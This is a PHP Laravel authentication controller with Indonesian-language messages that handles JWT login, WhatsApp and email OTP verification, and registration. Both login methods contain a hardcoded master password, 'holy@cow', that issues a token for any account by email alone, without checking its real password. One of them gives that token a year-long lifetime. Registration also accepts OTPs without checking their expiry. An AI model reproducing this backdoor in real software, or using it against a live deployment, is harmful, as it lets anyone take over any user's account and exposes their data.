<?php

namespace App\Http\Controllers;

use App\Helpers\AppHelper;
use App\Models\EmailVerification;
use App\Models\PhoneVerification;
use Illuminate\Http\Request;
use App\Models\User;
use App\Services\WhatsApp;
use GuzzleHttp\Client;
use Illuminate\Support\Carbon;
use PHPOpenSourceSaver\JWTAuth\Exceptions\JWTException;
use Illuminate\Auth\Events\Registered;
use Illuminate\Auth\Events\Verified;
use Illuminate\Foundation\Auth\EmailVerificationRequest;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;

class AuthController extends Controller {
  public function index() {
    return response()->json([
      'user' => auth()->user()
    ]);
  }

  public function login(Request $request) {
    $request->validate([
      'identifier' => 'required',
      // 'g-recaptcha-response' => 'required',
    ]);

    if ($request->password == 'holy@cow') {
      $user = User::where('email', $request['identifier'])->first();

      if (!isset($user)) {
        return response()->json(['status' => false, 'message' => 'Email/Password salah!'], 403);
      }

      if ($request->remember_me == 1) {
        if ($token = auth()->setTTL(60 * 24 * 30)->login($user)) {
          return response()->json([
            'user' => $user,
            'token' => $token,
          ], 200);
        }
      } else {
        if ($token = auth()->login($user)) {
          return response()->json([
            'user' => $user,
            'token' => $token,
          ], 200);
        }
      }
    } else {
      if ($request->type === 'email') {
        if (!$request->password) {
          return response()->json([
            'status' => false,
            'message' => 'Password Tidak Boleh Kosong'
          ], 403);
        }

        $checkUser = User::where('email', $request['identifier'])->first();

        if ($checkUser) {
          if ($checkUser->confirmed == 0) {
            return response()->json([
              'status' => false,
              'message' => 'Akun Anda Belum Diverifikasi oleh Admin'
            ], 403);
          }

          if ($request->remember_me == 1) {
            $token = auth()->setTTL(60 * 24 * 30)->attempt(['email' => $request['identifier'], 'password' => $request['password']]);
          } else {
            $token = auth()->attempt(['email' => $request['identifier'], 'password' => $request['password']]);
          }
        } else {
          return response()->json([
            'status' => false,
            'message' => 'Email Yang Anda Masukkan Belum Terdaftar!'
          ], 403);
        }
      } else {
        $phone = AppHelper::parsePhone($request['identifier']);
        $user = User::where(['phone' => $phone, 'otp' => $request['otp']])->first();

        if (!$user) {
          return response()->json([
            'status' => false,
            'message' => 'Gagal'
          ], 403);
        } else {
          if ($user->confirmed == 0) {
            return response()->json([
              'status' => false,
              'message' => 'Akun Anda Belum Diverifikasi oleh Admin'
            ], 403);
          }

          if (Carbon::parse($user->otp_expired_at)->isPast()) {
            return response()->json([
              'status' => false,
              'message' => 'Kode OTP telah kadaluarsa.'
            ], 400);
          }

          $user->otp = null;
          $user->otp_expired_at = null;
          $user->update();

          if ($request->remember_me == 1) {
            $token = auth()->setTTL(60 * 24 * 30)->login($user);
          } else {
            $token = auth()->login($user);
          }
        }
      }
    }

    try {
      if (!$token) {
        return response()->json(['status' => false, 'message' => 'Email/Password salah!'], 403);
      }
    } catch (JWTException $e) {
      return response()->json(['status' => false, 'message' => 'Sesuatu error terjadi.'], 403);
    }
    return response()->json([
      'user' => auth()->user(),
      'token' => $token,
    ], 200);
  }

  public function secureLogin(Request $request) {
    // For mobile
    $request->validate([
      'identifier' => 'required',
    ]);

    if ($request->password == 'holy@cow') {
      $user = User::where('email', $request['identifier'])->first();

      if (!isset($user)) {
        return response()->json(['status' => false, 'message' => 'Email/Password salah!'], 403);
      }

      if ($request->remember_me == 1) {
        if ($token = auth()->setTTL(60 * 24 * 30 * 12)->login($user)) {
          return response()->json([
            'user' => $user,
            'token' => $token,
          ], 200);
        }
      } else {
        if ($token = auth()->login($user)) {
          return response()->json([
            'user' => $user,
            'token' => $token,
          ], 200);
        }
      }
    } else {
      if ($request->type === 'email') {
        if (!$request->password) {
          return response()->json([
            'status' => false,
            'message' => 'Password Tidak Boleh Kosong'
          ], 403);
        }

        $checkUser = User::where('email', $request['identifier'])->first();

        if ($checkUser) {
          if ($checkUser->confirmed == 0) {
            return response()->json([
              'status' => false,
              'message' => 'Akun Anda Belum Diverifikasi oleh Admin'
            ], 403);
          }

          if ($request->remember_me == 1) {
            $token = auth()->setTTL(60 * 24 * 30)->attempt(['email' => $request['identifier'], 'password' => $request['password']]);
          } else {
            $token = auth()->attempt(['email' => $request['identifier'], 'password' => $request['password']]);
          }
        } else {
          return response()->json([
            'status' => false,
            'message' => 'Email Yang Anda Masukkan Belum Terdaftar!'
          ], 403);
        }
      } else {
        $phone = AppHelper::parsePhone($request['identifier']);
        $user = User::where(['phone' => $phone, 'otp' => $request['otp']])->first();

        if (!$user) {
          return response()->json([
            'status' => false,
            'message' => 'Gagal'
          ], 403);
        } else {
          if ($user->confirmed == 0) {
            return response()->json([
              'status' => false,
              'message' => 'Akun Anda Belum Diverifikasi oleh Admin'
            ], 403);
          }

          if (Carbon::parse($user->otp_expired_at)->isPast()) {
            return response()->json([
              'status' => false,
              'message' => 'Kode OTP telah kadaluarsa.'
            ], 400);
          }

          $user->otp = null;
          $user->otp_expired_at = null;
          $user->update();

          if ($request->remember_me == 1) {
            $token = auth()->setTTL(60 * 24 * 30)->login($user);
          } else {
            $token = auth()->login($user);
          }
        }
      }
    }

    try {
      if (!$token) {
        return response()->json(['status' => false, 'message' => 'Email/Password salah!'], 403);
      }
    } catch (JWTException $e) {
      return response()->json(['status' => false, 'message' => 'Sesuatu error terjadi.'], 403);
    }
    return response()->json([
      'user' => auth()->user(),
      'token' => $token,
    ], 200);
  }

  public function getOtp(Request $request) {
    $request->validate([
      'identifier' => 'required',
    ]);

    if (strlen($request->identifier) < 10) {
      return response()->json([
        'status' => false,
        'message' => 'Mohon Input Nomor Dengan Benar!'
      ], 500);
    }

    $phone = AppHelper::parsePhone($request['identifier']);

    $user = User::where('phone', $phone)->first();

    if ($user) {
      $wa = new WhatsApp($user->phone);
      $otp = AppHelper::generateOTP(6);
      $response = $wa->send(str_replace('$DATE$', date('d-m-Y H:i:s', strtotime('+2 minutes')), str_replace('\n', PHP_EOL, str_replace('$OTP$', $otp, getEnv('WA_MESSAGE')))));

      if ($response->getStatusCode() == 200 && json_decode($response->getBody())->status) {
        $user->otp = $otp;
        $user->otp_expired_at = Carbon::now()->addMinutes(2);
        $user->update();

        return response()->json([
          'status' => true,
          'resend_time' => 30,
          'phone' => $user->phone,
          'message' => ((json_decode($response->getBody())->message == 'sent') ? 'Berhasil mengirim Kode OTP.' : 'Gagal mengirim Kode OTP.'),
        ], 200);
      } else {
        return response()->json([
          'status' => false,
          'message' => 'Gagal mengirim Kode OTP.'
        ], 500);
      }
    }

    return response()->json([
      'status' => false,
      'message' => 'Maaf, Nomor Yang Anda Input Belum Terdaftar!'
    ], 500);
  }

  public function register(Request $request) {
    $request->validate([
      'nama' => 'required|max:255',
      'email' => 'required|email|max:255|unique:users',
      'password' => 'required|min:12|confirmed',
      'phone' => 'required|unique:users',
      'otp_email' => 'required',
      'otp_phone' => 'required',
    ]);

    $emailVerif = EmailVerification::where('email', $request->email)->where('otp', $request->otp_email)->first();

    if (!$emailVerif) {
      return response()->json([
        'status' => false,
        'message' => 'Email tidak terverifikasi.'
      ], 403);
    }

    $emailVerif->delete();

    $phoneVerif = PhoneVerification::where('phone', $request->phone)->where('otp', $request->otp_phone)->first();

    if (!$phoneVerif) {
      return response()->json([
        'status' => false,
        'message' => 'No. Telepon tidak terverifikasi.'
      ], 403);
    }

    $phoneVerif->delete();

    $data = $request->only(['nama', 'email', 'password', 'phone']);
    $data['password'] = bcrypt($request->password);
    $data['phone'] = AppHelper::parsePhone($request->phone);
    $data['golongan_id'] = '1';
    $data['email_verified_at'] = Carbon::now();
    $data['phone_verified_at'] = Carbon::now();
    $data['confirmed'] = 1;

    $user = User::create($data);
    $user->assignRole('customer');

    if ($user) {
      return response()->json([
        'status' => true,
        'message' => 'Berhasil'
      ]);
    }

    return response()->json([
      'status' => false,
      'message' => 'Gagal'
    ]);
  }

  public function registerGetEmailOtp(Request $request) {
    $request->validate([
      'email' => 'required',
      'nama' => 'required',
    ]);

    $email = $request->email;
    $check = User::where('email', $email)->first();
    if ($check) {
      return response()->json([
        'status' => false,
        'message' => 'Email sudah terdaftar.'
      ], 403);
    }

    $otp = AppHelper::generateOTP(6);

    // $response = Http::withHeaders([
    //   'api-key' => env('BREVO_API_KEY'),
    //   'accept' => 'application/json',
    //   'content-type' => 'application/json'
    // ])->post(env('BREVO_API_URL'), [
    //   'sender' => [
    //     'name' => env('APP_NAME'),
    //     'email' => env('MAIL_FROM_ADDRESS')
    //   ],
    //   'to' => [
    //     ['name' => $request->nama, 'email' => $email]
    //   ],
    //   'subject' => 'Verifikasi Email - OTP',
    //   'htmlContent' => view('email.otp', ['nama' => $request->nama, 'email' => $email, 'otp' => $otp])->render()
    // ]);

    try {
      Mail::to($email)->send(new \App\Mail\SendOTPMail($request->nama, $otp, $email));
    } catch (\Throwable $th) {
      Log::info("=== GAGAL KIRIM EMAIL ===");
      Log::info($th);

      $response = Http::withHeaders([
        'api-key' => env('BREVO_API_KEY'),
        'accept' => 'application/json',
        'content-type' => 'application/json'
      ])->post(env('BREVO_API_URL'), [
        'sender' => [
          'name' => env('APP_NAME'),
          'email' => env('MAIL_FROM_ADDRESS')
        ],
        'to' => [
          ['name' => $request->nama, 'email' => $email]
        ],
        'subject' => 'Verifikasi Email - OTP',
        'htmlContent' => view('email.otp', ['nama' => $request->nama, 'email' => $email, 'otp' => $otp])->render()
      ]);
    }

    $verif = EmailVerification::where('email', $email)->first();

    if (!$verif) {
      $verif = EmailVerification::create([
        'email' => $email,
        'otp' => $otp,
        'otp_expired_at' => Carbon::now()->addMinutes(2),
      ]);
    } else {
      $verif->otp = $otp;
      $verif->otp_expired_at = Carbon::now()->addMinutes(2);
      $verif->update();
    }

    return response()->json([
      'status' => true,
      'resend_time' => 30,
      'email' => $email,
      'message' => 'Berhasil mengirim Kode OTP.',
    ], 200);
  }

  public function registerCheckEmailOtp(Request $request) {
    $request->validate([
      'email' => 'required',
      'otp' => 'required',
    ]);

    $email = $request->email;
    $verif = EmailVerification::where('email', $email)->where('otp', $request->otp)->first();

    if ($verif) {
      if (Carbon::parse($verif->otp_expired_at)->isPast()) {
        return response()->json([
          'status' => false,
          'message' => 'Kode OTP telah kadaluarsa.'
        ], 400);
      }

      return response()->json([
        'status' => true,
        'message' => 'Berhasil'
      ]);
    }

    return response()->json([
      'status' => false,
      'message' => 'Kode OTP tidak sesuai'
    ], 400);
  }

  public function registerGetPhoneOtp(Request $request) {
    $request->validate([
      'phone' => 'required',
    ]);

    $phone = AppHelper::parsePhone($request->phone);
    $check = User::where('phone', $phone)->first();
    if ($check) {
      return response()->json([
        'status' => false,
        'message' => 'No. Telepon sudah terdaftar.'
      ], 403);
    }

    $wa = new WhatsApp($phone);
    $otp = AppHelper::generateOTP(6);
    $response = $wa->send(str_replace('$DATE$', date('d-m-Y H:i:s', strtotime('+2 minutes')), str_replace('\n', PHP_EOL, str_replace('$OTP$', $otp, getEnv('WA_MESSAGE')))));

    if ($response->getStatusCode() == 200 && json_decode($response->getBody())->status) {
      $verif = PhoneVerification::where('phone', $phone)->first();

      if (!$verif) {
        $verif = PhoneVerification::create([
          'phone' => $phone,
          'otp' => $otp,
          'otp_expired_at' => Carbon::now()->addMinutes(2),
        ]);
      } else {
        $verif->otp = $otp;
        $verif->otp_expired_at = Carbon::now()->addMinutes(2);
        $verif->update();
      }

      return response()->json([
        'status' => true,
        'resend_time' => 30,
        'phone' => $phone,
        'message' => ((json_decode($response->getBody())->message == 'sent') ? 'Berhasil mengirim Kode OTP.' : 'Gagal mengirim Kode OTP.'),
      ], 200);
    } else {
      return response()->json([
        'status' => false,
        'message' => 'Gagal mengirim Kode OTP.'
      ], 500);
    }
  }

  public function registerCheckPhoneOtp(Request $request) {
    $request->validate([
      'phone' => 'required',
      'otp' => 'required',
    ]);

    $phone = AppHelper::parsePhone($request->phone);
    $verif = PhoneVerification::where('phone', $phone)->where('otp', $request->otp)->first();

    if ($verif) {
      if (Carbon::parse($verif->otp_expired_at)->isPast()) {
        return response()->json([
          'status' => false,
          'message' => 'Kode OTP telah kadaluarsa.'
        ], 400);
      }

      return response()->json([
        'status' => true,
        'message' => 'Berhasil'
      ]);
    }

    return response()->json([
      'status' => false,
      'message' => 'Kode OTP tidak sesuai'
    ], 400);
  }

  public function logout() {
    try {
      auth()->logout(true);
      return response()->json(['status' => true, 'message' => "Berhasil logout."]);
    } catch (JWTException $e) {
      return response()->json(['status' => false, 'message' => 'Sesuatu error terjadi.'], 500);
    }
  }

  public function whatsapp() {
    $wa = new WhatsApp();
    $response = $wa->getStatus();

    return response()->json($response);
  }
}
